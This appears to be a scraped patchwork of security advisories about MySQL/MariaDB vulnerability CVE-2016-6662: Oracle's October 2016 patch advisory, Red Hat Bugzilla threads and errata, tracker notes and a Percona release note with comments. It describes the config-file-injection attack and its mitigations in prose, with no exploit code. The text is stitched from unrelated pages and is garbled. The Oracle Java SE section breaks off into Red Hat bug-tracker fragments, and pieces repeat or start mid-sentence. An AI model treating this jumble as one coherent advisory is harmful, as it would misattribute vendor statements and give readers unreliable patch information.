# Oracle Critical Patch Update Advisory - October 2016

## Oracle Critical Patch Update Advisory - October 2016

### Description

A Critical Patch Update (CPU) is a collection of patches for multiple security vulnerabilities. Critical Patch Update patches are usually cumulative, but each advisory describes only the security fixes added since the previous Critical Patch Update advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security fixes. Please refer to:

[Critical Patch Updates and Security Alerts](/security-alerts/) for information about Oracle Security Advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released fixes. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore *strongly* recommends that customers remain on actively-supported versions and apply Critical Patch Update fixes *without* delay.**

This Critical Patch Update contains 253 new security fixes across the product families listed below. Please note that a blog entry summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at <https://blogs.oracle.com/security>.

Please note that the vulnerabilities in this Critical Patch Update are scored using version 3.0 of Common Vulnerability Scoring Standard (CVSS).

This Critical Patch Update advisory is also available in an XML format that conforms to the Common Vulnerability Reporting Format (CVRF) version 1.1. More information about Oracle's use of CVRF is available [here](/security-alerts/cpufaq.html#CVRF).

#### Note:

* Vulnerabilities affecting Oracle Database and Oracle Fusion Middleware may affect Oracle Fusion Applications, so Oracle customers should refer to Oracle Fusion Applications Critical Patch Update Knowledge Document, [My Oracle Support Note 1967316.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1967316.1) for information on patches to be applied to Fusion Application environments.
* Users running Java SE with a browser can download the latest release from [http://java.com](http://java.com/). Users on the Windows and Mac OS X platforms can also use automatic updates to get the latest release.
* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2160904.1) for information on minimum revisions of security fixes required to resolve ZFSSA issues published in Critical Patch Updates (CPUs) and Solaris Third Party bulletins.
* Users can download the latest release of Netbeans from [http://netbeans.org](http://netbeans.org/). Users running earlier versions of Netbeans can use automatic updates to get the latest patches.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly fixed by the patches associated with this advisory. Risk matrices for previous security fixes can be found in [previous Critical Patch Update advisories](/security-alerts/). An English text version of the risk matrices provided in this document is [here](/security-alerts/cpuoct2016verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](http://cve.mitre.org/) which is a unique identifier for a vulnerability. A vulnerability that affects multiple products will appear with the same **CVE#** in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.0 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.0).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update (CPU). Oracle does not disclose information about the security analysis, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](/corporate/security-practices/assurance/vulnerability/disclosure.html).

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply CPU fixes as soon as possible**. Until you apply the CPU fixes, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security fixes as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security fixes announced in this CPU, please review [previous Critical Patch Update advisories](/security-alerts/) to determine appropriate actions.

### Product Dependencies

Oracle products may have dependencies on other Oracle products. Hence security vulnerability fixes announced in this Critical Patch Update may affect one or more dependent Oracle products. For details regarding these dependencies and how to apply patches to dependent products, please refer to Patch Set Update and Critical Patch Update October 2016 Availability Document, [My Oracle Support Note 2171485.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2171485.1).

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the [Lifetime Support Policy](/support/lifetime-support/). We recommend that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Supported Database, Fusion Middleware, Oracle Enterprise Manager Base Platform (formerly "Oracle Enterprise Manager Grid Control") and Collaboration Suite products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=209768.1). Please review the [Technical Support Policies](/support/policies.html) for further guidelines regarding support policies and phases of support.

### Products in Extended Support

Patches released through the Critical Patch Update program are available to customers who have Extended Support under the [Lifetime Support Policy](/support/lifetime-support/). Customers must have a valid Extended Support service contract to download patches released through the Critical Patch Update program for products in the Extended Support Phase.

### Appendix - Oracle Java SE

#### Oracle Java SE Executive Summary

This Critical Patch Update contains 7 new security fixes for Oracle Java SE. All of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials. The English text form of this Risk Matrix can be found [here](/security-alerts/cpuoct2016verbose.html#JAVA).

The CVSS scores below assume that a user running a Java applet or Java Web Start application has administrator privileges (typical on Windows). When the user does not run with administrator privileges (typical on Solaris and Linux), the corresponding CVSS impact scores for Confidentiality, Integrity, and Availability are "Low" instead of "High", lowering the CVSS Base Score. For example, a Base Score of 9.6 becomes 7.1.

Users should only use the default Java Plug-in and Java Web Start from the latest JDK or JRE 8 releases.

With this update, mariadb-galera's RPM installation scripts now use a different systemctl command, correctly detecting the default MariaDB as disabled, and the installer can succeed. | | | Clone Of: | [1375184](show_bug.cgi?id=1375184 "CLOSED ERRATA - mysqld service prevents haproxy to get started and deployment fails") | | | Environment: |  | | | Last Closed: | 2016-10-13 14:04:47 UTC | | | Target Upstream Version: |  | | | Embargoed: |  | | |

RHEL Engineering is moving the tracking of its product development work on RHEL 6 through RHEL 9 to Red Hat Jira ([**issues.redhat.com**](https://issues.redhat.com)). If you're a Red Hat customer, please continue to file support cases via the [**Red Hat customer portal**](https://access.redhat.com/support/cases/). If you're not, please head to the "[**RHEL project**](https://issues.redhat.com/projects/RHEL)" in Red Hat Jira and file new tickets here. Individual Bugzilla bugs in the statuses "**NEW**", "**ASSIGNED**", and "**POST**" are being migrated throughout September 2023. Bugs of Red Hat partners with an assigned Engineering Partner Manager (EPM) are migrated in late September as per pre-agreed dates. Bugs against components "**kernel**", "**kernel-rt**", and "**kpatch**" are only migrated if still in "**NEW**" or "**ASSIGNED**". If you cannot log in to RH Jira, please consult [**article #7032570**](https://access.redhat.com/articles/7032570). That failing, please send an e-mail to the RH Jira admins at **rh-issues@redhat.com** to troubleshoot your issue as a user management inquiry. The email creates a ServiceNow ticket with Red Hat. Individual Bugzilla bugs that are migrated will be moved to status "**CLOSED**", resolution "**MIGRATED**", and set with "**MigratedToJIRA**" in "**Keywords**". The link to the successor Jira issue will be found under "**Links**", have a little "two-footprint" icon next to it, and direct you to the "[**RHEL project**](https://issues.redhat.com/projects/RHEL)" in Red Hat Jira (issue links are of type "**https://issues.redhat.com/browse/RHEL-XXXX**", where "**X**" is a digit). This same link will be available in a blue banner at the top of the page informing you that that bug has been migrated.

| [Description](show_bug.cgi?id=1335863#c0)  Jiri Jaburek    2016-05-13 12:16:40 UTC  ``` Description of problem:  At least the following binaries,  /usr/bin/mysqlimport /usr/bin/mysqltest /usr/bin/mysql_client_test /usr/bin/mysql_plugin /usr/bin/mysql_upgrade /usr/bin/mysqlslap /usr/bin/mysqltest_embedded /usr/bin/mysql_waitpid /usr/bin/mysqladmin /usr/bin/mysql_client_test_embedded /usr/bin/mysql_tzinfo_to_sql /usr/bin/mysql /usr/bin/mysqldump /usr/bin/mysqlshow /usr/bin/mysqlcheck /usr/bin/mysqlbinlog  are compiled as Position Independent Executables (PIE), but with lazy binding enabled (no BIND_NOW / NOW). This not only slows the startup down (adding one layer of indirection for PIE), but also creates potential security issues.  Please compile these as either  - non-PIE, with "partial" RELRO: gcc -Wl,-z,relro - PIE, with "full" RELRO: gcc -fPIE -pie -Wl,-z,relro,-z,now  *not* in any combination of the two (for one binary).  Generally speaking, PIE + "full" RELRO is recommended for anything that doesn't start too often (as it provides the best protection at a slight cost in startup time) such as daemons, SUID binaries or anything having extra privileges and handling unsafe user data. For anything else, "Partial" RELRO is recommended.   Version-Release number of selected component (if applicable): mariadb-5.5.47-1.el7_2  How reproducible: always  Steps to Reproduce: 1. readelf -a <path-to-binary> | less 2. look for addresses, see them being relative, starting at 0 2.1. (also see ELF type at the top - should be DYN) 3. look for BIND_NOW or NOW, without success  Actual results: binaries compiled as PIE with "partial" RELRO  Expected results: binaries either compiled as PIE+"full" RELRO or non-PIE+"partial" RELRO  Additional info: /usr/libexec/mysqld seems to have correctly PIE + "full" RELRO.   ```  [Comment 2](show_bug.cgi?id=1335863#c2)  Honza Horak    2016-06-27 12:40:11 UTC  ``` *** [Bug 1092548](show_bug.cgi?id=1092548) has been marked as a duplicate of this bug. ***   ```  [Comment 3](show_bug.cgi?id=1335863#c3)  Matej Mužila    2016-06-29 10:28:26 UTC  ``` Created [attachment 1173765](attachment.cgi?id=1173765&action=diff "proposed patch") [[details]](attachment.cgi?id=1173765&action=edit "proposed patch") proposed patch   ```  [Comment 8](show_bug.cgi?id=1335863#c8)  errata-xmlrpc    2016-11-03 20:48:37 UTC  ``` Since the problem described in this bug report should be resolved in a recent advisory, it has been closed with a resolution of ERRATA.

# CVE-2016-6662

| **Name** | CVE-2016-6662 |
| --- | --- |
| **Description** | Oracle MySQL through 5.5.52, 5.6.x through 5.6.33, and 5.7.x through 5.7.15; MariaDB before 5.5.51, 10.0.x before 10.0.27, and 10.1.x before 10.1.17; and Percona Server before 5.5.51-38.1, 5.6.x before 5.6.32-78.0, and 5.7.x before 5.7.14-7 allow local users to create arbitrary configurations and bypass certain protection mechanisms by setting general\_log\_file to a my.cnf configuration. NOTE: this can be leveraged to execute arbitrary code with root privileges by setting malloc\_lib. NOTE: the affected MySQL version information is from Oracle's October 2016 CPU. Oracle has not commented on third-party claims that the issue was silently patched in MySQL 5.5.52, 5.6.33, and 5.7.15. |

## Notes

```
This will likely be split by MITRE, unclear what precisely maps to CVE-2016-6662
As well unclear which commits from <https://bugzilla.redhat.com/show_bug.cgi?id=1375198#c5> are associated
yet to which CVE; those will unlikely made public before the next Oracle CPU.
<https://marc.info/?l=oss-security&m=147367658314062&w=2>
<http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html>
<https://bugzilla.suse.com/show_bug.cgi?id=998309>
Fixed in upstream Oracle MySQL 5.5.52, 5.6.33 and 5.7.15
MariaDB: <https://jira.mariadb.org/browse/MDEV-10465>
Fixed in upstream MariaDB 5.5.51, 10.0.27, 10.1.17
PerconaDB: <https://www.percona.com/blog/2016/09/12/database-affected-cve-2016-6662/>
Although Oracle mentions this CVE only to be fixed in 5.5.53 this is not
true for src:mysql-5.5 as in Debian and other Linux distributions, so
this CVE should not be listed for a DSA/DLA based on 5.5.53, cf #841050

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2016%3A2061)

## Topic

An update for mariadb-galera is now available for Red Hat Enterprise Linux OpenStack Platform 7.0 (Kilo) for RHEL 7.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

MariaDB is a multi-user, multi-threaded SQL database server that is binary compatible with MySQL. Galera is a synchronous multi-master cluster for MariaDB.

Security Fix(es):

* It was discovered that the MySQL logging functionality allowed writing to MySQL configuration files. An administrative database user, or a database user with FILE privileges, could possibly use this flaw to run arbitrary commands with root privileges on the system running the database server. (CVE-2016-6662)

Bug Fix(es):

* Previously, both the mariadb-server and mariadb-galera-server packages shipped the client-facing libraries, dialog.so and mysql\_clear\_password.so. As a result, the mariadb-galera-server package would fail to install because of package conflicts. With this update, these libraries have been moved from mariadb-galera-server to mariadb-libs, and the mariadb-galera-server package installs successfully. (BZ#1376904)
* Because Red Hat Enterprise Linux 7.3 changed the return format of the "systemctl is-enabled" command as consumed by shell scripts, the mariadb-galera RPM package, upon installation, erroneously detected that the MariaDB service was enabled when it was not. As a result, the Red Hat OpenStack Platform installer, which then tried to run mariadb-galera using Pacemaker and not systemd, failed to start Galera. With this update, mariadb-galera's RPM installation scripts now use a different systemctl command, correctly detecting the default MariaDB as disabled, and the installer can succeed. (BZ#1376910)

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

After installing this update, the MariaDB server daemon (mysqld) will be restarted automatically.

## Affected Products

* Red Hat OpenStack 7 x86\_64

## Fixes

* [BZ - 1375198](https://bugzilla.redhat.com/show_bug.cgi?id=1375198)
  - CVE-2016-6662 mysql: general\_log can write to configuration files, leading to privilege escalation
* [BZ - 1376904](https://bugzilla.redhat.com/show_bug.cgi?id=1376904)
  - RHEL 7.3 upgrades fails on upgrade because of mariadb-libs package conflict.
* [BZ - 1376910](https://bugzilla.redhat.com/show_bug.cgi?id=1376910)
  - mysqld service prevents haproxy to get started and deployment fails

## Topic

An update for mariadb is now available for Red Hat Enterprise Linux 7.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

MariaDB is a multi-user, multi-threaded SQL database server that is binary compatible with MySQL.

The following packages have been upgraded to a newer upstream version: mariadb (5.5.52). (BZ#1304516, BZ#1377974)

Security Fix(es):

* It was discovered that the MariaDB logging functionality allowed writing to MariaDB configuration files. An administrative database user, or a database user with FILE privileges, could possibly use this flaw to run arbitrary commands with root privileges on the system running the database server. (CVE-2016-6662)
* A race condition was found in the way MariaDB performed MyISAM engine table repair. A database user with shell access to the server running mysqld could use this flaw to change permissions of arbitrary files writable by the mysql system user. (CVE-2016-6663)
* This update fixes several vulnerabilities in the MariaDB database server. Information about these flaws can be found on the Oracle Critical Patch Update Advisory page, listed in the References section. (CVE-2016-3492, CVE-2016-5612, CVE-2016-5616, CVE-2016-5624, CVE-2016-5626, CVE-2016-5629, CVE-2016-8283)

Additional Changes:

For detailed information on changes in this release, see the Red Hat Enterprise Linux 7.3 Release Notes linked from the References section.

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

After installing this update, the MariaDB server daemon (mysqld) will be restarted automatically.

As a result, the Red Hat OpenStack Platform installer, which then tried to run mariadb-galera using Pacemaker and not systemd, failed to start Galera. With this update, mariadb-galera's RPM installation scripts now use a different systemctl command, correctly detecting the default MariaDB as disabled, and the installer can succeed. | | | Clone Of: | [1375184](show_bug.cgi?id=1375184 "CLOSED ERRATA - mysqld service prevents haproxy to get started and deployment fails") | | | Environment: |  | | | Last Closed: | 2016-10-18 23:06:34 UTC | | | Target Upstream Version: |  | | | Embargoed: |  | | |

# Percona Server 5.5.51-38.1 is now available

August 19, 2016

[Hrvoje Matijakovic](https://www.percona.com/blog/author/hrvojem)

![percona server 5.5.51-38.1](data:image/svg+xml...)*Percona*announces the release of *[Percona Server](https://www.percona.com/software/percona-server)* 5.5.51-38.1 on August 19, 2016. Based on [MySQL 5.5.51](http://dev.mysql.com/doc/relnotes/mysql/5.5/en/news-5-5-51.html), including all the bug fixes in it, *Percona Server* 5.5.51-38.1 is now the current stable release in the 5.5 series.

*Percona Server* is open-source and free. You can find release details of the release in the [5.5.51-38.1 milestone](https://launchpad.net/percona-server/%2Bmilestone/5.5.51-38.1) on Launchpad. Downloads are available [here](https://www.percona.com/downloads/Percona-Server-5.5/) and from the [Percona Software Repositories](https://www.percona.com/doc/percona-server/5.5/installation.html#installing-from-binaries).

###### Bugs Fixed:

* [PAM Authentication Plugin](https://www.percona.com/doc/percona-server/5.5/management/pam_plugin.html) would abort authentication while checking UNIX user group membership if there were more than a thousand members. Bug fixed [#1608902](https://bugs.launchpad.net/percona-server/%2Bbug/1608902).
* [PAM Authentication Plugin](https://www.percona.com/doc/percona-server/5.5/management/pam_plugin.html) didn’t support spaces in the UNIX user group names. Bug fixed [#1544443](https://bugs.launchpad.net/percona-server/%2Bbug/1544443).
* If `DROP DATABASE` would fail to delete some of the tables in the database, the partially-executed command is logged in the binlog as `DROP TABLE t1, t2, ...` for the tables for which drop succeeded. A slave might fail to replicate such DROP TABLE statement if there exist foreign key relationships to any of the dropped tables and the slave has a different schema from the master. Fixed by checking, on the master, whether any of the database to be dropped tables participate in a Foreign Key relationship, and fail the `DROP DATABASE` statement immediately. Bug fixed [#1525407](https://bugs.launchpad.net/percona-server/%2Bbug/1525407) (upstream [#79610](http://bugs.mysql.com/bug.php?id=79610)).
* *Percona Server* 5.5 could not be built with the `-DMYSQL_MAINTAINER_MODE=ON` option. Bug fixed [#1590454](https://bugs.launchpad.net/percona-server/%2Bbug/1590454).
* In the client library, any `EINTR` received during network I/O was not handled correctly. Bug fixed [#1591202](https://bugs.launchpad.net/percona-server/%2Bbug/1591202) (upstream [#82019](http://bugs.mysql.com/bug.php?id=82019)).
* The included `.gitignore` in the percona-server source distribution had a line `*.spec`, which means someone trying to check in a copy of the percona-server source would be missing the spec file required to build the RPM packages. Bug fixed [#1600051](https://bugs.launchpad.net/percona-server/%2Bbug/1600051).
* The fix for bug [#1341067](https://bugs.launchpad.net/percona-server/%2Bbug/1341067) added a call to free some of the heap memory allocated by OpenSSL. This was not safe for repeated calls if OpenSSL is linked twice through different libraries and each is trying to free the same. Bug fixed [#1604676](https://bugs.launchpad.net/percona-server/%2Bbug/1604676).
* If the changed page bitmap redo log tracking thread stops due to any reason, then shutdown will wait for a long time for the log tracker thread to quit, which it never does. Bug fixed [#1606821](https://bugs.launchpad.net/percona-server/%2Bbug/1606821).
* Performing slow InnoDB shutdown (`innodb_fast_shutdown` set to `0`) could result in an incomplete purge, if a separate purge thread is running (which is a default in *Percona Server*). Bug fixed [#1609364](https://bugs.launchpad.net/percona-server/%2Bbug/1609364).
* Due to security reasons `ld_preload` libraries can now only be loaded from the system directories (`/usr/lib64`, `/usr/lib`) and the *MySQL* installation base directory.

This new release instantly refused to start with malloc-lib set to jemalloc, while the previous versions worked as expected. What changed? No errors were being logged, and the log file itself wasn’t even being opened. This caused us an extended service outage which could have been avoided.

Hi,

For security reasons ld\_preload libraries can now only be loaded from system directories. It looks like this change was omitted from the change log and this announcement.

 0  ![Andrei ZeeGiant](data:image/svg+xml...) Andrei ZeeGiant    8 years ago

Hello,

Thanks for the update! When you say system directories, are there any in particular? For example jemalloc was being loaded using:

malloc-lib=’/usr/local/lib/libjemalloc.so’

However, this technically is a “system directory”.

 0  ![Andrei ZeeGiant](data:image/svg+xml...) Andrei ZeeGiant    8 years ago

To answer my own question. The only dirs which work to ld\_preload are:

/usr/lib
 /usr/lib64

I also want to mention that symlinks pointing outside of these lib dirs can be used as it doesn’t seem they’re being dereferenced. For example, I now have malloc-lib=’/usr/lib64/libjemalloc.so’, where /usr/lib64/libjemalloc.so is a symlink to /usr/local/lib/libjemalloc.so, which is also a symlink to /usr/local/lib/libjemalloc.so.2. The MySQL service however, clearly shows it loaded:

mysqld 12853 mysql mem REG 9,0 292817 3530336 /usr/local/lib/libjemalloc.so.2

However, I would expect the following to all work if used, and not just the two /usr/lib’s from above:

/usr/local/lib
 /usr/local/lib64
 /lib
 /lib64

Thanks for reporting this, I’ll need to check the suggestion about adding the /usr/local/ as the original recommendation came from our security team.

| [Description](show_bug.cgi?id=1375198#c0)  Adam Mariš    2016-09-12 13:16:58 UTC  ``` A vulnerability in MySQL was found that allows:  1. injecting malicious configuration into existing MySQL configuration files on systems with weak/improper permissions (configs owned by/writable by mysql user)  2. creating new configuration files within a MySQL data directory (writable by MySQL by default) on _default_ MySQL installs without the need to rely on improper config permisions.  3. gaining access to logging functions (normally only available to MySQL admin users) to attackers with only SELECT/FILE permissions on all of the default_ MySQL installations and thus be in position to add/modify MySQL config files.

In addition, the --mysqld and --mysqld-version   options can be used only on the command line and not in an option file.

MySQL 5.7.15 also includes this additional change:    mysqld_safe attempted to read my.cnf in the data directory, although   that is no longer a standard option file location. (Bug #24482156)  <https://github.com/mysql/mysql-server/commit/71f48ab393bce80a59e5a2e498cd1f46f6b43f9a>  Oracle is probably not going to acknowledge these fixes with CVEs until the next CPU scheduled for mid-October.   ```  [Comment 12](show_bug.cgi?id=1375198#c12)  Tomas Hoger    2016-09-14 21:40:22 UTC  ``` All MySQL and MariaDB packages in Red Hat Enterprise Linux and Red Hat Software Collections install my.cnf configuration file as root-owned and not writeable to the mysql user under which mysqld is run.  The configuration file is created in /etc and not inside the data directory.  All MySQL and MariaDB packages in at least Red Hat Enterprise Linux 6 and later, and Red Hat Software Collections allow database users with FILE privileges to create my.cnf file inside data directory that is not world-writeable, and hence is not ignored by mysqld / mysqld_safe.  All MySQL and MariaDB packages for Red Hat Enterprise Linux 7 (either directly from Red Hat Enterprise Linux 7 or from Red Hat Software Collections for Red Hat Enterprise Linux 7) run mysqld_safe with mysql user privileges and not root privileges.  Therefore, the worst impact of this issue on Red Hat Enterprise Linux 7 is escalation form database user with FILE privileges to arbitrary code execution as mysql system user.  Additionally, the init script / systemd unit for rh-mariadb101 collection for Red Hat Enterprise Linux 7 does not use mysqld_safe at all and is therefore not vulnerable to the published exploit.  The MySQL 5.1 packages in Red Hat Enterprise Linux 6 include the version of mysqld_safe that does not implement support for library preloading.  Therefore, the published remote exploit does not affect those packages.  Note that there is still a possibility of local privilege escalation - a database user with FILE privileges that also has local unprivileged shell access can escalate their privileges to root.  For certain MySQL / MariaDB packages running on Red Hat Enterprise Linux 7, the issue is further mitigated by SELinux, which prevents loading of the injected shared library.  Mitigating factors:  - The attack can only be performed by an attacker with database access with FILE privileges.  The FILE privilege is not commonly granted to non-administrative database users, and as noted in the reporter's advisory, it allows gaining full administrative privileges (unless restricted with the secure_file_priv setting).  As noted in the advisory, SQL injection flaws in web applications may open up this issue to attackers who are not meant to have direct database access.  Ensure that the FILE privilege is not granted to any non-administrative database user.  Note that reporter claims existence of another, not yet disclosed vulnerability which makes exploitation of this issue possible without FILE privilege.  The [CVE-2016-6663](https://access.redhat.com/security/cve/CVE-2016-6663) was reserved for the additional vulnerability.  - Published exploit depends on an already existing my.cnf that is writeable to the mysql user.  As noted above, in the default configuration of MySQL/MariaDB packages in Red Hat Enterprise Linux and Red Hat Software Collections, the configuration file is not writeable to the mysql user.  While the advisory describes how to create a new my.cnf in the data directory that is read by mysqld / mysqld_safe, the newly created file is rejected as malformed as it does not start with a valid INI file section delimiter.  The advisory does not mention any way to avoid this exploitation obstacle.  The combination of the above two factors imply that the published exploit does not work against the default configuration of MySQL and MariaDB in Red Hat products.   ```  [Comment 13](show_bug.cgi?id=1375198#c13)  Stefan Cornelius    2016-09-15 10:12:14 UTC  ``` Statement:  All MySQL and MariaDB packages in Red Hat Enterprise Linux and Red Hat Software Collections install the my.cnf configuration file in /etc as root-owned and not writeable to mysqld's mysql user. This default configuration stops the published exploit for this issue.  All MySQL and MariaDB packages for Red Hat Enterprise Linux 7 (either those directly included in Red Hat Enterprise Linux 7 or from Red Hat Software Collections for Red Hat Enterprise Linux 7) run mysqld_safe with mysql user privileges and not root privileges, limiting the potential impact to code execution as mysql system user.  The MySQL 5.1 packages in Red Hat Enterprise Linux 6 do not implement support for library preloading, completely preventing the remote attack vector used by the published exploit.  For additional details, refer to:  [https://bugzilla.redhat.com/show_bug.cgi?id=1375198#c12](show_bug.cgi?id=1375198#c12 "CLOSED ERRATA - CVE-2016-6662 mysql: general_log can write to configuration files, leading to privilege escalation (CPU Oct 2016)")   Mitigation:  - Ensure all MySQL / MariaDB configuration files are not writeable to the mysql user. This is the default configuration in Red Hat products.  - Ensure that non-administrative database users are not granted FILE privilege. Applications accessing data in MySQL / MariaDB databases, including web application potentially vulnerable to SQL injections, should use database accounts with the lowest privileges required.  - If FILE permission needs to be granted to some non-administrative database users, use secure_file_priv setting to limit where files can be written to or read from.   ```  [Comment 14](show_bug.cgi?id=1375198#c14)  Tomas Hoger    2016-09-16 08:10:13 UTC  ``` (In reply to Tomas Hoger from [comment #12](show_bug.cgi?id=1375198#c12)) > The MySQL 5.1 packages in Red Hat Enterprise Linux 6 include the version of > mysqld_safe that does not implement support for library preloading.  > Therefore, the published remote exploit does not affect those packages.   The same applies to MySQL 5.0 packages in Red Hat Enterprise Linux 5.  Additionally, MySQL 5.0 does not support general_log, which is also required by this exploit.  The support for general_log was added in version 5.1.29:    Important Change: The --log option now is deprecated and will be removed   (along with the log system variable) in the future. Instead, use the   --general_log option to enable the general query log and the   --general_log_file=file_name option to set the general query log file name.   The values of these options are available in the general_log and   general_log_file system variables, which can be changed at runtime.    <http://downloads.mysql.com/docs/mysql-5.1-relnotes-en.pdf>  As hinted by the above, --log could not be changed at runtime.   ```  [Comment 18](show_bug.cgi?id=1375198#c18)  Gerald Prock    2016-09-21 05:38:56 UTC  ``` It seams, that the bug is already abused in the wild.

At the > moment we have been lucky and there was no link to a *.so file  For this attack, attacker needs to have ability to execute arbitrary SQL queries.  Have you figured out how they were able to do so, as that's likely an issue of its own?  Do you have untrusted DB users with high privileges, or vulnerable web app which also connects to DB using a privileged DB account?  > but otherwise the mysql_safe would load them on start with root permissions. >  > Example for RHEL7:  Your example is on RHEL-7, where mysqld_safe is not run with root permissions, but as mysql OS user.

Comments above note that DB user with sufficient privileges can create new my.cnf file inside of the data directory.  That file is read by mysqld, and as it's not valid INI file, it leads to the service restart failure as you describe.   ```  [Comment 29](show_bug.cgi?id=1375198#c29)  Tomas Hoger    2016-09-28 09:11:22 UTC  ``` Reporter's advisory (linked in [comment 0](show_bug.cgi?id=1375198#c0)) has been updated few times since the original publication.  The most notable changes include:  * The list of affected MySQL versions was updated to note that the issue was fixed in versions 5.5.52, 5.6.33, and 5.7.15, as noted in [comment 5](show_bug.cgi?id=1375198#c5) above.  * Author now more explicitly claims that even though published exploit requires existing my.cnf file that is writeable to the mysql system user, there is a different exploit that has not been published yet, which does not require existing my.cnf with weak permissions.  Advisory explains that it is possible to create new my.cnf file in the data directory, which has to be writeable to the mysql user.  Such file does not typically exist.  When created using the general_log mechanism used by the exploit, it will not start with INI file [section] label, causing it to be rejected by MySQL as invalid and its content ignored.  It is unclear if a mechanism used to create a well-formed my.cnf using MySQL logging would be classified as a separate vulnerability.  The advisory includes the following mitigation instructions:    As temporary mitigations, users should ensure that no mysql config files   are owned by mysql user, and create root-owned dummy my.cnf files that   are not in use.   These are by no means a complete solution and users should apply official   vendor patches as soon as they become available.  It is unclear why this contradicting information is given, and if the private exploit can work if root-owned my.cnf exist in the data directory.   ```  [Comment 30](show_bug.cgi?id=1375198#c30)  Tomas Hoger    2016-09-28 09:33:28 UTC  ``` Various MySQL and MariaDB packages in Red Hat Enterprise Linux and Red Hat Software Collections may different default locations for the data directory.  A subset of these files are used by each version:  /var/lib/mysql/.my.cnf /var/lib/mysql/my.cnf /opt/rh/mysql55/root/var/lib/mysql/my.cnf /var/opt/rh/rh-mysql56/lib/mysql/my.cnf /opt/rh/mariadb55/root/var/lib/mysql/my.cnf /var/opt/rh/rh-mariadb100/lib/mysql/my.cnf /var/opt/rh/rh-mariadb101/lib/mysql/my.cnf  Creating the above files if their parent directory exists on a system as root-owned and not writeable to the mysql user follows the mitigation advice from the reporter's advisory.   ```  [Comment 33](show_bug.cgi?id=1375198#c33)  Fedora Update System    2016-10-03 20:20:15 UTC  ``` mariadb-10.0.27-1.fc23 has been pushed to the Fedora 23 stable repository.

Those versions change change the default for secure_file_priv, the setting which controls where database user with FILE privileges can write files.  Depending on the build, it's either NULL (preventing use of FILE privilege), or an empty dedicated directory that is created by Oracle distributed binary packages.  Additionally, mysqld now tries to detect insecure secure_file_priv setting at startup and refuse to start if it's insecure.  The following settings are considered insecure:  - empty secure_file_priv, allowing read/write to any directory - secure_file_priv pointing to data directory or its subdirectory - secure_file_priv pointing to directory accessible to all users  <http://dev.mysql.com/doc/relnotes/mysql/5.5/en/news-5-5-53.html> <http://dev.mysql.com/doc/relnotes/mysql/5.6/en/news-5-6-34.html> <http://dev.mysql.com/doc/relnotes/mysql/5.7/en/news-5-7-16.html>  This commit adds these changes:  <https://github.com/mysql/mysql-server/commit/7cb79a65ba6286ac66d5ebbebea3243ef97f5c41>   ```  [Comment 42](show_bug.cgi?id=1375198#c42)  Tomas Hoger    2016-10-18 21:22:27 UTC  ``` This CVE is not mentioned in the Oracle CPU Oct 2016:  <http://www.oracle.com/technetwork/security-advisory/cpuoct2016-2881722.html#AppendixMSQL>  Note that the CPU lists version 5.5.52, 5.6.33, and 5.7.15 as affected by this issue despite fixes that were applied in those versions - see [comment 5](show_bug.cgi?id=1375198#c5).

| --- | --- |
| Affected versions | < **5.6.34** |
| Unaffected versions | >= **5.6.34** |

### Background

